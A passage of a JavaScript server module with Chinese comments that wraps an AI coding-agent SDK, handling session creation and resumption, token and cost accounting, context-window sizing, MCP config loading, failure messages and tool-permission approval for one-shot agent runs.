   *   2. `normalizedToChatMessages` 把带 `parentToolUseId` 的 text / thinking / tool_use /
   *      tool_result / stream_delta 挡在顶层之外,归进父卡的 `childTools`。
   * 两者各有回归测试(见 user-turn-provenance / subagentNestedTranscript)。
   */
  sdkOptions.forwardSubagentText = true;
  /**
   * 子代理运行时卡片上那行「它现在在干什么」。
   *
   * SDK(`Options.agentProgressSummaries`):每 ~30 秒 fork 一次子代理的会话,生成一句现在时的描述
   * (如 "Analyzing authentication module"),从 `task_progress` 的 `summary` 字段发出;前台和后台
   * 子代理都适用,fork 复用子代理自己的模型与 prompt cache,成本通常极小。
   * 没有它,活标签只能退回 `last_tool_name`(「Bash」「Read」),那只说明用了什么工具。
   */
  sdkOptions.agentProgressSummaries = true;

  /**
   * 新建会话时指定 id,而不是让 SDK 自动生成。
   *
   * SDK 的 `Options.sessionId`("Use a specific session ID for the conversation instead of an
   * auto-generated one. Must be a valid UUID")让 transcript 原样落成 `<id>.jsonl`。Prism 用它把应用侧
   * 会话 id 和 provider 原生 id 定成同一个值,接口因此能在回合开跑前就把最终 id 返给调用方,
   * 对方直接拼 `/session/<id>` 就能打开这段对话。
   *
   * 与 `resume` 互斥:CLI 拒绝同时给两个(`forkSession` 除外);传了 newSessionId 就是要开新的,新建优先。
   *
   * 非法 UUID 或 id 已被占用时,CLI 直接退出 1 并在 stderr 写明原因
   * (`Invalid session ID. Must be a valid UUID.` / `Session ID <x> is already in use.`),
   * 不会穿越目录,也不会续写进别人的对话;但调用方只看得到退出码,所以这两种情况应在路由层先拦。
   */
  if (newSessionId) {
    sdkOptions.sessionId = newSessionId;
  } else if (sessionId) {
    sdkOptions.resume = sessionId;
  }

  /**
   * 无人值守的入口:需要审批的工具调用立刻拒绝,不挂着等。
   *
   * `/api/agent` 一律按 bypass 起,发起人不在 `PRISM_ALLOW_BYPASS_USERS` 名单里就降成 acceptEdits
   * (见 applyServerToolPolicy),定时任务同理;这时碰到 Bash 就会发审批,调 API 的程序答不了,
   * 一次性路径要等满审批上限(默认 1 小时)才拒。`permissionPrompts: 'none'`(需要 SDK 0.3.259 /
   * CLI 2.1.259 及以上)让 `canUseTool` 不再被调,工具结果直接是「本会话无人审批,已自动拒绝,动作未执行」,
   * 模型据此换路。档位、规则、hooks 照常起作用,被拒的只是本来要问人的那一类。
   */
  if (options.unattended === true) {
    sdkOptions.permissionPrompts = 'none';
  }

  return sdkOptions;
}

/**
 * Adds a session to the active sessions map
 * @param {string} sessionId - Session identifier
 * @param {Object} queryInstance - SDK query instance
 * @param {Object} writer - WebSocket writer for reconnect support
 * @param {AbortController|null} abortController - Hard-abort channel for a hung subprocess
 */
function addSession(sessionId, queryInstance, writer = null, abortController = null) {
  activeSessions.set(sessionId, {
    instance: queryInstance,
    startTime: Date.now(),
    status: 'active',
    writer,
    // 强制中止通道:interrupt() 走与子进程的协商通道,子进程僵死时它也会挂住,
    // 而「停止」恰恰最常发生在僵死时。超时后用它直接拆掉 query 并杀掉子进程。
    abortController
  });
}

/**
 * Removes a session from the active sessions map
 * @param {string} sessionId - Session identifier
 */
function removeSession(sessionId) {
  activeSessions.delete(sessionId);
}

/**
 * Gets a session from the active sessions map
 * @param {string} sessionId - Session identifier
 * @returns {Object|undefined} Session data or undefined
 */
function getSession(sessionId) {
  return activeSessions.get(sessionId);
}

/**
 * Gets all active session IDs
 * @returns {Array<string>} Array of active session IDs
 */
function getAllSessions() {
  return Array.from(activeSessions.keys());
}

/**
 * Transforms SDK messages to WebSocket format expected by frontend
 * @param {Object} sdkMessage - SDK message object
 * @returns {Object} Transformed message ready for WebSocket
 */
function transformMessage(sdkMessage) {
  // Extract parent_tool_use_id for subagent tool grouping
  if (sdkMessage.parent_tool_use_id) {
    return {
      ...sdkMessage,
      parentToolUseId: sdkMessage.parent_tool_use_id
    };
  }
  return sdkMessage;
}

function readNumber(value) {
  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed : 0;
}

/** Per-model context-window fallbacks used when no exact reading exists. */
const MODEL_CONTEXT_WINDOWS = [
  { pattern: /^claude-/i, total: 200000 },
];
/**
 * 最后的兜底:CLI 对不认识的模型名按 200000 计算(unknown-model window enforcement),分母与 CLI 同口径。
 */
const LEGACY_CONTEXT_WINDOW = 200000;

/**
 * 回合中途的用量环分母。
 *
 * 优先级:`getContextUsage().maxTokens` 实测值(有效窗口,与 CLI 同一个数)→ 模型目录里这个模型的窗口
 * (runtime 启动时定下;一次性路径传请求的模型名,网关改写了回复里的名字也查得到)→ 按回复里的模型名查目录
 * → `CONTEXT_WINDOW` 环境变量(只作兜底,排在前面会压住目录与实测)→ 按名字推断 → 200000。
 * @param {Object|null} runtime - 常驻 runtime;一次性路径传 `{ contextWindow, currentModel }`
 * @param {Object|null} sdkMessage - SDK message (assistant messages carry `message.model`)
 * @returns {number} Context window size in tokens
 */
function resolveContextWindowTokens(runtime, sdkMessage) {
  const exactTotal = runtime?.lastContextUsage?.maxTokens;
  if (Number.isFinite(exactTotal) && exactTotal > 0) return exactTotal;

  const catalogWindow = runtime?.contextWindow;
  if (Number.isFinite(catalogWindow) && catalogWindow > 0) return catalogWindow;

  const model = sdkMessage?.message?.model || runtime?.currentModel || '';
  const byName = typeof model === 'string' && model ? claudeModelCatalog.lookup(model)?.contextWindow : null;
  if (Number.isFinite(byName) && byName > 0) return byName;

  const envWindow = parseInt(process.env.CONTEXT_WINDOW, 10);
  if (Number.isFinite(envWindow) && envWindow > 0) return envWindow;

  if (typeof model === 'string' && model) {
    for (const entry of MODEL_CONTEXT_WINDOWS) {
      if (entry.pattern.test(model)) return entry.total;
    }
  }
  return LEGACY_CONTEXT_WINDOW;
}

/**
 * 一轮对话的 token 累加器。
 *
 * `message.usage` 是每次 API 调用的用量,一轮里可能调十几次(每用一次工具再来一次)。逐条累加
 * (accumulateUsage)是兜底;result 帧带了这一轮的汇总时以它为准(见 mergeResultUsage)。
 * 最后一条 assistant 消息的 usage 只约等于当前上下文占用(`/cost` 弹窗的进度条),不是这一轮的花费;
 * `usage.routes.ts` 的 `parseTokenUsageTotals` 取的就是最后一条,别照着它算花费。
 */
export function createUsageAccumulator() {
  return {
    inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheCreationTokens: 0, model: null,
    // 子代理部分单独再记一份:result 帧的汇总只含主循环,子代理的调用不在里面。
    subagent: { inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheCreationTokens: 0 },
  };
}

/** 把一条 SDK 消息里的 usage 累加进去;没有 usage 的消息忽略。 */
export function accumulateUsage(accumulator, sdkMessage) {
  if (!accumulator || !sdkMessage || typeof sdkMessage !== 'object') return;
  const usage = sdkMessage.message?.usage;
  if (!usage || typeof usage !== 'object') return;
  // 一次 API 调用有几个内容块(文字 + 工具调用),CLI 就吐几条 assistant 消息,带的是同一份 usage
  // (同一个 message.id)。按 id 只记第一次,否则一次调用会算两三遍。
  const messageId = sdkMessage.message?.id;
  if (typeof messageId === 'string' && messageId) {
    if (!accumulator.seenMessageIds) accumulator.seenMessageIds = new Set();
    if (accumulator.seenMessageIds.has(messageId)) return;
    accumulator.seenMessageIds.add(messageId);
  }
  accumulator.inputTokens += readNumber(usage.input_tokens ?? usage.inputTokens);
  accumulator.outputTokens += readNumber(usage.output_tokens ?? usage.outputTokens);
  accumulator.cacheReadTokens += readNumber(usage.cache_read_input_tokens ?? usage.cacheReadInputTokens);
  accumulator.cacheCreationTokens += readNumber(usage.cache_creation_input_tokens ?? usage.cacheCreationInputTokens);
  if (sdkMessage.parent_tool_use_id && accumulator.subagent) {
    const sub = accumulator.subagent;
    sub.inputTokens += readNumber(usage.input_tokens ?? usage.inputTokens);
    sub.outputTokens += readNumber(usage.output_tokens ?? usage.outputTokens);
    sub.cacheReadTokens += readNumber(usage.cache_read_input_tokens ?? usage.cacheReadInputTokens);
    sub.cacheCreationTokens += readNumber(usage.cache_creation_input_tokens ?? usage.cacheCreationInputTokens);
  }
  const model = sdkMessage.message?.model ?? sdkMessage.model;
  if (typeof model === 'string' && model) accumulator.model = model;
}

/**
 * 用 result 帧上这一轮的用量汇总覆盖逐条累加的值;result 帧没带用量时保留累加值。
 *
 * 逐条累加在我们这套网关下两头都可能错:
 * - 少记:`includePartialMessages = false` 时,CLI 在内容块结束时就吐出 assistant 消息,那时 `message.usage`
 *   还是 message_start 的快照;网关把 output_tokens(多数时候还有 input_tokens)放在 message_delta 里,
 *   到达时那条消息已经发出去了;
 * - 多记:一次 API 调用有几个内容块就吐几条 assistant 消息,带的是同一份 usage。
 * result 帧的 `usage` 是 CLI 在每次 message_stop 时累加出的这一轮汇总,两个问题都没有。它只算这一轮,
 * 不是会话累计(与 total_cost_usd 不同):CLI 每次提问新建 QueryEngine,构造时 totalUsage 归零、
 * 只在 message_stop 累加,所以直接用,不做差分。
 */
export function mergeResultUsage(accumulator, resultMessage) {
  if (!accumulator) return accumulator;
  const totals = resultMessage?.usage;
  if (totals && typeof totals === 'object') {
    const fromResult = {
      inputTokens: readNumber(totals.input_tokens ?? totals.inputTokens),
      outputTokens: readNumber(totals.output_tokens ?? totals.outputTokens),
      cacheReadTokens: readNumber(totals.cache_read_input_tokens ?? totals.cacheReadInputTokens),
      cacheCreationTokens: readNumber(totals.cache_creation_input_tokens ?? totals.cacheCreationInputTokens),
    };
    const sum = fromResult.inputTokens + fromResult.outputTokens + fromResult.cacheReadTokens + fromResult.cacheCreationTokens;
    if (sum > 0) {
      // 子代理的调用不进主循环的 totalUsage,把逐条累加的子代理部分补上(它同样可能偏少,
      // 但总比整段丢掉强;子代理的费用本来就在 total_cost_usd 里,费用列不受影响)。
      const sub = accumulator.subagent ?? { inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheCreationTokens: 0 };
      accumulator.inputTokens = fromResult.inputTokens + sub.inputTokens;
      accumulator.outputTokens = fromResult.outputTokens + sub.outputTokens;
      accumulator.cacheReadTokens = fromResult.cacheReadTokens + sub.cacheReadTokens;
      accumulator.cacheCreationTokens = fromResult.cacheCreationTokens + sub.cacheCreationTokens;
    }
  }
  return accumulator;
}

/**
 * 一轮结束,记一条账。
 *
 * 全程 try/catch,永远不抛:台账是旁路数据,写在对话的收尾路径上,
 * 因为磁盘满之类的问题让整轮对话报错,代价远大于丢一行账。
 */
function recordTurnUsage(accumulator, resultMessage, context) {
  try {
    if (!accumulator) return;
    mergeResultUsage(accumulator, resultMessage);
    const costCumulative = readNumber(resultMessage?.total_cost_usd ?? resultMessage?.totalCostUsd);
    // 一条 token 都没有、也没有费用 —— 空轮(比如立刻被中止),不记。
    const hasTokens = accumulator.inputTokens + accumulator.outputTokens
      + accumulator.cacheReadTokens + accumulator.cacheCreationTokens > 0;
    if (!hasTokens && costCumulative <= 0) return;

    usageRecordsDb.record({
      sessionId: context.sessionId ?? null,
      projectPath: context.projectPath ?? null,
      userId: context.userId ?? null,
      username: context.username ?? null,
      provider: 'claude',
      model: accumulator.model ?? context.model ?? null,
      source: context.source ?? 'chat',
      inputTokens: accumulator.inputTokens,
      outputTokens: accumulator.outputTokens,
      cacheReadTokens: accumulator.cacheReadTokens,
      cacheCreationTokens: accumulator.cacheCreationTokens,
      costUsdCumulative: costCumulative,
      durationMs: context.durationMs ?? null,
    });
  } catch (error) {
    log.error('[usage] 记账失败(不影响对话):', error?.message ?? error);
  }
}

/**
 * Extracts token usage from SDK messages.
 * Prefers per-step `message.usage` (Claude message payload), then falls back
 * to result-level usage/modelUsage for compatibility across SDK versions.
 * @param {Object} sdkMessage - SDK stream message
 * @param {Object|null} runtime - Persistent runtime whose exact context total refines the estimate denominator
 * @returns {Object|null} Token budget object or null
 */
function extractTokenBudget(sdkMessage, runtime = null) {
  if (!sdkMessage || typeof sdkMessage !== 'object') {
    return null;
  }

  // 会话累计费用(美元)。只有 result 帧带它;顺着 token_budget 状态帧透传,
  // 前端聚合时对缺席帧保留上一次的值(见 useChatRealtimeHandlers)。
  const costUsd = readNumber(sdkMessage.total_cost_usd ?? sdkMessage.totalCostUsd);
  const costField = costUsd > 0 ? { costUsd } : {};

  const messageUsage = sdkMessage.message?.usage || sdkMessage.usage;
  if (messageUsage && typeof messageUsage === 'object') {
    const directInputTokens = readNumber(messageUsage.input_tokens ?? messageUsage.inputTokens);
    const cacheCreationTokens = readNumber(messageUsage.cache_creation_input_tokens ?? messageUsage.cacheCreationInputTokens ?? messageUsage.cacheCreationTokens);
    const cacheReadTokens = readNumber(messageUsage.cache_read_input_tokens ?? messageUsage.cacheReadInputTokens ?? messageUsage.cacheReadTokens);
    const cacheTokens = cacheCreationTokens + cacheReadTokens;
    const inputTokens = directInputTokens + cacheTokens;
    const outputTokens = readNumber(messageUsage.output_tokens ?? messageUsage.outputTokens);
    const totalUsed = inputTokens + outputTokens;
    const contextWindow = resolveContextWindowTokens(runtime, sdkMessage);

    return {
      used: totalUsed,
      total: contextWindow,
      inputTokens,
      outputTokens,
      cacheReadTokens,
      cacheCreationTokens,
      cacheTokens,
      ...costField,
      breakdown: {
        input: inputTokens,
        output: outputTokens,
      },
    };
  }

  if (!sdkMessage.modelUsage || typeof sdkMessage.modelUsage !== 'object') {
    return null;
  }

  // Fallback for messages that carry only modelUsage
  const modelKey = Object.keys(sdkMessage.modelUsage)[0];
  const modelData = sdkMessage.modelUsage[modelKey];

  if (!modelData || typeof modelData !== 'object') {
    return null;
  }

  const inputTokens = readNumber(modelData.cumulativeInputTokens ?? modelData.inputTokens);
  const outputTokens = readNumber(modelData.cumulativeOutputTokens ?? modelData.outputTokens);
  const totalUsed = inputTokens + outputTokens;
  const contextWindow = resolveContextWindowTokens(runtime, sdkMessage);

  return {
    used: totalUsed,
    total: contextWindow,
    inputTokens,
    outputTokens,
    ...costField,
    breakdown: {
      input: inputTokens,
      output: outputTokens,
    },
  };
}

/**
 * Builds the SDK `prompt` payload for one turn.
 *
 * Plain text turns pass the string through unchanged. Turns with image
 * attachments use the SDK's streaming-input mode: a single SDKUserMessage
 * whose content carries the prompt text plus one base64 `image` block per
 * attachment (read from the global `~/.prism/assets` folder).
 *
 * @param {string} command - User prompt
 * @param {Array} images - Image descriptors ({ path, name?, mimeType? })
 * @param {string} cwd - Project working directory image paths resolve against
 * @returns {Promise<string|AsyncIterable>} SDK prompt payload
 */
async function buildPromptPayload(command, images, cwd, imageRoots = []) {
  if (normalizeImageDescriptors(images).length === 0) {
    return command;
  }

  // 允许的图片目录由 `chat.send` 的校验算好传入,两处校验必须基于同一份目录。
  const content = await buildClaudeUserContent(command, images, cwd, imageRoots);
  return (async function* () {
    yield {
      type: 'user',
      message: {
        role: 'user',
        content
      },
      parent_tool_use_id: null,
      timestamp: new Date().toISOString()
    };
  })();
}

/**
 * Loads MCP server configurations from ~/.claude.json
 * @param {string} cwd - Current working directory for project-specific configs
 * @returns {Object|null} MCP servers object or null if none found
 */
async function loadMcpConfig(cwd) {
  try {
    const claudeConfigPath = path.join(os.homedir(), '.claude.json');

    try {
      await fs.access(claudeConfigPath);
    } catch (error) {
      return null;
    }

    let claudeConfig;
    try {
      const configContent = await fs.readFile(claudeConfigPath, 'utf8');
      claudeConfig = JSON.parse(configContent);
    } catch (error) {
      log.error('Failed to parse ~/.claude.json:', error.message);
      return null;
    }

    // Global servers first; project-specific entries (keyed by cwd) override them by name.
    let mcpServers = {};

    if (claudeConfig.mcpServers && typeof claudeConfig.mcpServers === 'object') {
      mcpServers = { ...claudeConfig.mcpServers };
    }

    if (claudeConfig.claudeProjects && cwd) {
      const projectConfig = claudeConfig.claudeProjects[cwd];
      if (projectConfig && projectConfig.mcpServers && typeof projectConfig.mcpServers === 'object') {
        mcpServers = { ...mcpServers, ...projectConfig.mcpServers };
      }
    }

    if (Object.keys(mcpServers).length === 0) {
      return null;
    }
    return mcpServers;
  } catch (error) {
    log.error('Error loading MCP config:', error.message);
    return null;
  }
}

/**
 * 一次性回合交给调用方的结果。
 *
 * 定时任务(`scheduled-tasks.service`)与外部 Agent API 拿的是 promise 而不是 writer,只能从这里得知成败,
 * 据此决定重试、连续失败停手与失败通知。常驻路径的调用方读 writer,不用这个对象。
 *
 * @typedef {{ ok: boolean, exitCode: 0|1, aborted: boolean, rejected?: boolean, error: string|null, sessionId: string|null }} OneShotOutcome
 */
function oneShotOutcome({ ok, aborted = false, error = null, sessionId = null, rejected = false }) {
  return {
    ok,
    exitCode: ok ? 0 : 1,
    aborted,
    // 闸口 / 网关拒绝(模型不许用、没有 key、网关停用……):重试也是同样结果,定时任务据此不重试
    ...(rejected ? { rejected: true } : {}),
    error: ok ? null : (error || (aborted ? '回合被中止' : '回合失败')),
    sessionId,
  };
}

/**
 * `result.terminal_reason` → 给用户看的说明(只覆盖失败的那几种)。错误原文多半是英文 API 报错,
 * 说明要告诉用户为什么失败、下一步该做什么。
 */
const TERMINAL_REASON_HINTS = {
  prompt_too_long: '上下文超过了网关 / 模型的上限 —— 先发 /compact,或换一个窗口更大的模型',
  rapid_refill_breaker: '短时间内反复撞上上下文上限,CLI 熔断了 —— 先发 /compact 再继续',
  api_error: '网关一直返回错误,CLI 重试用尽 —— 稍后再试,或换一个模型',
  malformed_tool_use_exhausted: '模型连续给出格式不对的工具调用,CLI 放弃了 —— 这个模型的工具调用不稳,换一个模型试试',
  model_error: '模型出错了 —— 稍后再试,或换一个模型',
  image_error: '图片没被接受(格式或大小)—— 换一张或缩小后再发',
  max_turns: '达到了轮数上限',
  budget_exhausted: '达到了预算上限',
  blocking_limit: '触发了用量上限',
  turn_setup_failed: '这一轮没能开始(CLI 内部错误)—— 再发一次',
  tool_deferred_unavailable: '恢复时发现要用的工具已经不在了',
  structured_output_retry_exhausted: '结构化输出重试用尽',
};

export function describeTerminalReason(reason) {
  return typeof reason === 'string' && Object.prototype.hasOwnProperty.call(TERMINAL_REASON_HINTS, reason)
    ? TERMINAL_REASON_HINTS[reason]
    : null;
}

/** result 的 `modelUsage` → `{ 模型: { out: 累计输出 tokens, in: 累计输入 tokens } }`。 */
export function modelUsageSnapshot(modelUsage) {
  const out = {};
  if (!modelUsage || typeof modelUsage !== 'object') return out;
  for (const [name, entry] of Object.entries(modelUsage)) {
    const o = Number(entry?.outputTokens ?? entry?.output_tokens ?? 0);
    const i = Number(entry?.inputTokens ?? entry?.input_tokens ?? 0);
    out[name] = { out: Number.isFinite(o) ? o : 0, in: Number.isFinite(i) ? i : 0 };
  }
  return out;
}

/** 这一轮出力最多的模型:先比输出增量,都没有输出(失败的一轮)再比输入增量;一个都没动 → null。 */
export function turnModelFromUsage(current, base) {
  let best = null;
  for (const key of ['out', 'in']) {
    let bestDelta = 0;
    for (const [name, entry] of Object.entries(current ?? {})) {
      const delta = Number(entry?.[key] ?? 0) - Number(base?.[name]?.[key] ?? 0);
      if (delta > bestDelta) {
        bestDelta = delta;
        best = name;
      }
    }
    if (best) return best;
  }
  return null;
}

/**
 * 常驻 runtime 里 result 的 `modelUsage` 是整个进程的累计值(换过模型后形如
 * `{"glm-5.2":40,"deepseek-v4":20}`),按累计输出最多取模型会把换模型之后的回合记到旧模型头上。
 * 读循环每见到一个 result 就在这里记下它之前的累计,记健康度时按差值取这一轮真正出力的模型。
 */
const resultUsageBase = new WeakMap();
function noteResultModelUsage(runtime, message) {
  if (!runtime || message?.type !== 'result') return;
  resultUsageBase.set(message, runtime.lastModelUsage ?? null);
  if (message.modelUsage && typeof message.modelUsage === 'object') runtime.lastModelUsage = modelUsageSnapshot(message.modelUsage);
}

/**
 * 每个用户回合记一行模型健康度(见 model-turn-stats.db)。模型取这一轮 `modelUsage` 里输出最多的那个
 * (别名会话也记成真实的网关模型;常驻 runtime 按与上一个 result 的差值算,见 resultUsageBase);
 * 没有就用请求的模型名。永不抛。
 */
export function recordModelTurnStat(resultMessage, { model = null, source = 'chat', previousUsage = undefined } = {}) {
  try {
    if (!resultMessage || typeof resultMessage !== 'object' || resultMessage.type !== 'result') return;
    if (resultMessage.local_command) return; // /cost /context 这类本地命令不算模型回合
    const base = previousUsage !== undefined ? previousUsage : (resultUsageBase.get(resultMessage) ?? null);
    const realModel = turnModelFromUsage(modelUsageSnapshot(resultMessage.modelUsage), base);
    const name = realModel || (typeof model === 'string' && model && model !== 'default' ? model : null);
    if (!name) return;
    const isError = Boolean(resultMessage.is_error) || (typeof resultMessage.subtype === 'string' && resultMessage.subtype !== 'success');
    const reason = typeof resultMessage.terminal_reason === 'string' ? resultMessage.terminal_reason : null;
    // 用户自己按的停止不算模型的失败
    if (reason === 'aborted_streaming' || reason === 'aborted_tools') return;
    modelTurnStatsDb.record({
      model: name,
      source,
      isError,
      terminalReason: isError ? (reason || resultMessage.subtype || 'unknown') : null,
      ttftMs: readNumber(resultMessage.ttft_ms ?? resultMessage.ttft_stream_ms) || null,
      durationMs: readNumber(resultMessage.duration_ms) || null,
    });
  } catch (error) {
    log.warn('[model-stats] 记录失败(不影响对话):', error?.message || error);
  }
}

/**
 * result 帧里「业务失败」的原因文案;不是失败时返回 null。
 *
 * 能按 terminal_reason 给出说明时先给说明、原文附在后面。SDK 的失败 result 有三种形状:`is_error` +
 * `result` 字符串(API 错误原文)、`subtype: 'error_max_turns'` 之类不带正文、以及 `errors: string[]`。
 * 都取不到就用 subtype 兜底,运行记录里至少要有一个词。
 */
export function describeOneShotResultError(message) {
  if (!message || typeof message !== 'object') return null;
  const isError = Boolean(message.is_error)
    || (typeof message.subtype === 'string' && message.subtype !== 'success');
  if (!isError) return null;
  // 先给说明,原文跟在后面(运行记录 / API 调用方都看得到)
  const hint = describeTerminalReason(message.terminal_reason);
  if (hint) {
    const raw = typeof message.result === 'string' && message.result.trim() ? message.result.trim().slice(0, 300) : null;
    return raw ? `${hint}(${raw})` : hint;
  }
  if (typeof message.result === 'string' && message.result.trim()) return message.result.trim();
  if (Array.isArray(message.errors) && message.errors.length > 0) {
    return message.errors.map((entry) => String(entry)).join('; ');
  }
  return typeof message.subtype === 'string' ? message.subtype : 'result is_error';
}

/**
 * Executes a one-shot Claude query: each call spins up a fresh SDK query and resumes via session id.
 * Serves the external Agent API, scheduled tasks, and the fallback when the resident pool is full.
 * @param {string} command - User prompt/command
 * @param {Object} options - Query options
 * @param {Object} ws - WebSocket connection
 * @param {Object|null} runEntry - Gateway run registry entry (abort-by-runId)
 * @returns {Promise<OneShotOutcome>}
 */
async function queryClaudeSDKOnce(command, options = {}, ws, runEntry = null) {
  const { sessionId, sessionSummary } = options;
  let capturedSessionId = sessionId;
  let sessionCreatedSent = false;
  const stderrTail = createStderrTail();
  /** 这一轮带 key 的 flag 设置文件(没有网关补丁时为 null),回合结束删除。 */
  let oneShotFlagSettingsFile = null;

  /**
   * 起跑前先检查中止标记(`abortedSessionIds` / `runEntry.aborted`)。用户可能在这一轮真正 spawn 之前
   * 就按了停止(建会话、releaseClaudeSession、加载 MCP 配置、解析模型,加起来能到秒级),这时不能再启动进程。
   *
   * 消费标记用 `delete` 而不是 `has`,与本文件其它消费点一致:标记留着会让下一条消息也被判成已中止。
   */
  const abortedBeforeStart = (sessionId ? abortedSessionIds.delete(sessionId) : false)
    || Boolean(runEntry?.aborted);
  if (abortedBeforeStart) {
    log.info(`[Claude SDK] 回合在起跑前已被中止,不再启动(session=${sessionId || 'NEW'})`);
    return oneShotOutcome({ ok: false, aborted: true, sessionId: sessionId || null });
  }

  /**
   * resume 一段对话之前,先让它常驻着的 CLI 退下(releaseClaudeSession)。
   *
   * 网页刚聊完时 runtime 空闲常驻(默认 30 分钟不回收、没有活跃 run)。外部 API 带同一个 sessionId
   * 发一条一次性回合,就会有第二个 CLI 进程 resume 同一段 provider 会话;之后网页再发一条,常驻那个
   * 用内存里不含 API 回合的历史继续往同一个 jsonl 追加,两条历史交错且无法修复。运行位只挡并发的 run,
   * 挡不住空闲常驻。
   *
   * 有回合正在跑(或有后台任务)时明确报错、不发:让调用方看见冲突,好过静默双写。
   * 模型过不了闸口时这一轮反正发不出去(下面 try 里会抛),不必先让空闲的网页 runtime 退下。
   */
  const viewer = turnViewer(options, ws);
  const modelWillPass = !(sessionId && !options.newSessionId) || await claudeModelCatalog.isUsable(
    (await providerModelsService.resolveResumeModel('claude', modelLookupSessionId(options), options.model).catch(() => null))
      || options.model,
    viewer,
  );
  if (sessionId && !options.newSessionId && modelWillPass) {
    const release = await releaseClaudeSession(sessionId);
    if (!release.released && (release.reason === 'turn_in_flight' || release.reason === 'background_tasks')) {
      const background = release.reason === 'background_tasks';
      const busy = new Error(
        background
          ? `会话 ${sessionId} 还有后台任务在跑,一次性调用不能同时 resume 它 —— 等它们跑完,或在后台任务条上停掉。`
          : `会话 ${sessionId} 正在跑一个回合,一次性调用不能同时 resume 它 —— 等它结束或先停止。`,
      );
      busy.prismRuntimeBusy = true;
      // 聊天里看到它的,是常驻路径失败后退到这里的那一条(见分发器的 fallBackToOneShot),换成聊天里的说法
      describeForUser(busy, background ? 'RUNTIME_BUSY_BACKGROUND' : 'RUNTIME_BUSY_TURN', background
        ? '这一条没有发出:这段对话还有后台任务在跑 —— 等它们跑完,或在后台任务条上停掉,再发这条。'
        : '这一条没有发出:这段对话的 CLI 还在跑上一轮(或还有工具没收尾)—— 等它跑完再发。');
      throw busy;
    }
  }

  const emitNotification = (event) => {
    notifyUserIfEnabled({
      userId: ws?.userId || null,
      writer: ws,
      event
    });
  };

  try {
    // app 会话 id 优先(见 modelLookupSessionId)。
    const resolvedModel = await providerModelsService.resolveResumeModel(
      'claude',
      modelLookupSessionId(options),
      options.model,
    );
    const effortModels = effortModelsFor(viewer);

    // 闸口、目录窗口、网关与 key、子代理模型(见 modelRuntimeSettings)。不允许的模型在这里抛,落到下面的 catch。
    const { contextWindow, gateway, subagentEnv } = await modelRuntimeSettings(resolvedModel || options.model, viewer);

    const sdkOptions = mapCliOptionsToSDK({
      ...options,
      model: resolvedModel || options.model,
      effortModels,
      contextWindow,
      gateway,
      subagentEnv,
    }, stderrTail);
    // 带 key 的 flag 设置文件,这一轮结束(成功 / 失败 / 中止)就删
    oneShotFlagSettingsFile = takeFlagSettingsFile(sdkOptions);

    const mcpServers = await loadMcpConfig(options.cwd);
    if (mcpServers) {
      sdkOptions.mcpServers = mcpServers;
    }

    // 强制中止手柄(常驻路径在 buildPersistentSdkOptions 里有同样的):interrupt() 挂死时停止按钮会失效,
    // 超时兜底和静默看门狗用它直接 abort 掉子进程。
    const oneShotAbortController = new AbortController();
    sdkOptions.abortController = oneShotAbortController;

    // Turns with image attachments switch to streaming input so the images
    // ride along as real content blocks. Built per query attempt because an
    // async generator cannot be replayed once consumed.
    const createPrompt = () => buildPromptPayload(command, options.images, options.cwd, options.imageRoots);

    sdkOptions.hooks = {
      Notification: [{
        matcher: '',
        hooks: [async (input) => {
          const message = typeof input?.message === 'string' ? input.message : 'Claude requires your attention.';
          emitNotification(createNotificationEvent({
            provider: 'claude',
            sessionId: capturedSessionId || sessionId || null,
            kind: 'action_required',
            code: 'agent.notification',
            meta: { message, sessionName: sessionSummary },
            severity: 'warning',
            requiresUserAction: true,
            dedupeKey: `claude:hook:notification:${capturedSessionId || sessionId || 'none'}:${message}`
          }));
          return {};
        }]
      }]
    };

    // Caveat: in 'auto' and 'bypassPermissions' modes the SDK resolves approval
    // at the permission-mode step and skips this callback, so interactive tools
    // (AskUserQuestion, ExitPlanMode) won't reach the UI — the classifier/bypass
    // auto-approves them and the model acts on a generated answer. Move these
    // tools to a PreToolUse hook (runs before the mode check) if we need them
    // to work in those modes.
    sdkOptions.canUseTool = async (toolName, input, context) => {
      const requiresInteraction = TOOLS_REQUIRING_INTERACTION.has(toolName);

      if (!requiresInteraction) {
        if (sdkOptions.permissionMode === 'bypassPermissions') {
          return { behavior: 'allow', updatedInput: input };
        }

        const isDisallowed = (sdkOptions.disallowedTools || []).some(entry =>
          matchesToolPermission(entry, toolName, input)
        );
        if (isDisallowed) {
          return { behavior: 'deny', message: 'Tool disallowed by settings' };
        }

        const isAllowed = (sdkOptions.allowedTools || []).some(entry =>
          matchesToolPermission(entry, toolName, input)
        );
        if (isAllowed) {
          return { behavior: 'allow', updatedInput: input };
        }
      }

      const requestId = createRequestId();
      // 这个人记不下放行项(见 mayRememberApprovals)时前端不出「允许并记住」;记在待批请求上,刷新后补发的卡片也带着
      const suppressAlwaysAllow = !mayRememberApprovals(options.actorUsername);
      sendPermissionRequest(
        ws,
        createNormalizedMessage({
          kind: 'permission_request', requestId, toolName, input, sessionId: capturedSessionId || sessionId || null, provider: 'claude',
          ...(suppressAlwaysAllow ? { suppressAlwaysAllow: true } : {}),
        }),
        { toolName, sessionId: capturedSessionId || sessionId || null },
      );
      emitNotification(createNotificationEvent({
        provider: 'claude',
        sessionId: capturedSessionId || sessionId || null,
        kind: 'action_required',
        code: 'permission.required',
        meta: { toolName, sessionName: sessionSummary },
        severity: 'warning',
        requiresUserAction: true,
        dedupeKey: `claude:permission:${capturedSessionId || sessionId || 'none'}:${requestId}`
      }));

      const decision = await waitForToolApproval(requestId, {
        // 非交互工具不能无限等:没人回答的审批会把 SDK 进程和一次性名额长期占住。上限见
        // ONESHOT_APPROVAL_TIMEOUT_MS,足够覆盖重连、切页、午休;交互工具(AskUserQuestion / ExitPlanMode)不设上限。
        timeoutMs: requiresInteraction ? 0 : ONESHOT_APPROVAL_TIMEOUT_MS,
        signal: context?.signal,
        metadata: {
          _sessionId: capturedSessionId || sessionId || null,
          // app 会话 id:新会话开局时 provider 原生 id 为 null,补发与授权用它兜底。
          _appSessionId: typeof options.runId === 'string' ? options.runId : null,
          _toolName: toolName,
          _input: input,
          _receivedAt: new Date(),
          _suppressAlwaysAllow: suppressAlwaysAllow,
        },
        onCancel: (reason) => {
